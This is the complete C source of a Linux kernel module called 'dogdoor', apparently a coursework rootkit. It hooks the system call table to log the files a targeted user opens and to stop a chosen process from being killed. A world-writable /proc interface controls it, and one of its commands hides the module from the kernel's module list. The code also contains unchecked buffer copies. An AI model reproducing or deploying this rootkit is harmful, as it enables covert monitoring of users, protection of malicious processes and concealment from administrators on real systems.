#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <asm/unistd.h>
MODULE_LICENSE("GPL");

char filepath[128] = { 0x0, } ;
char log_file[10][128] = { 0x0, } ;
int current_line = 0 ;

void ** sctable ;
struct list_head *my_list ;

int no_kill_process = -1 ;
int tracking_user = -1 ;

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 

asmlinkage int (*orig_sys_kill)(pid_t pid, int sig) ;

asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
{
	char fname[256] ;
	kuid_t cred_user_id ;
	const struct cred *cred = current_cred() ;

	copy_from_user(fname, filename, 256) ;
	
	cred_user_id = cred->uid ;
	
	if (tracking_user == cred_user_id.val) {
		strcpy(log_file[current_line], fname) ;
		printk("%s\n", fname) ;
		current_line = (current_line + 1) % 10 ;
	}

	return orig_sys_open(filename, flags, mode) ;
}

asmlinkage int dogdoor_sys_kill(pid_t pid, int sig) {
	if (pid == no_kill_process) {
	printk("Process Kill Fail.\n") ; 
		return -1 ;
	}	
	
	return orig_sys_kill(pid, sig) ;
}

static 
int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0 ;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[512] ;
	int i = 0 ;
	ssize_t toread ;
	buf[0] = 0 ;

	if (tracking_user == -1) {
		strcpy(buf, "Error. Execute Command 1 First.\n") ;
	} else {
		for (i=0 ; i<10 ; i++) {
			sprintf(buf, "%s%s\n", buf, log_file[current_line]) ;
			log_file[current_line][0] = 0 ;
			current_line = (current_line+1) % 10 ;
		}	
	}

//	tracking_user = -1 ;

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread)) {
		return -EFAULT ;	
	}

	*offset = *offset + toread ;
	return toread ;
}

static 
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[128] ;
	const char *temp ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;
	temp = buf+2 ; 

	switch (buf[0]) {
		case '1' :
			sscanf(temp, "%d", &tracking_user) ;
			printk("tracking user : %d\n", tracking_user) ;
			break ;

		case '3' :
			sscanf(temp, "%d", &no_kill_process) ;
			printk("kill process : %d\n", no_kill_process) ;
			break ;

		case '4' :
			no_kill_process = -1 ;
			break ;

		case '5' :
			my_list = (&THIS_MODULE->list)->next ;
			list_del(&THIS_MODULE->list) ;
			break ;

		case '6' :
			my_list->prev->next = &THIS_MODULE->list ;
			(&THIS_MODULE->list)->next = my_list ;
			
			(&THIS_MODULE->list)->prev = my_list->prev ;
			my_list->prev = &THIS_MODULE->list ;
			break ;

	}

	*offset = strlen(buf) ;

	return *offset ;
}

static const struct file_operations dogdoor_fops = {
	.owner = 	THIS_MODULE,
	.open = 	dogdoor_proc_open,
	.read = 	dogdoor_proc_read,
	.write = 	dogdoor_proc_write,
	.llseek = 	seq_lseek,
	.release = 	dogdoor_proc_release,
} ;

static 
int __init dogdoor_init(void) {
	unsigned int level ; 
	pte_t * pte ;
	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open] ;
	orig_sys_kill = sctable[__NR_kill] ;

	pte = lookup_address((unsigned long) sctable, &level) ;
	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW ;		

	sctable[__NR_open] = dogdoor_sys_open ;
	sctable[__NR_kill] = dogdoor_sys_kill ;

	return 0;
}

static 
void __exit dogdoor_exit(void) {
	unsigned int level ;
	pte_t * pte ;
	remove_proc_entry("dogdoor", NULL) ;

	sctable[__NR_open] = orig_sys_open ;
	sctable[__NR_kill] = orig_sys_kill ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
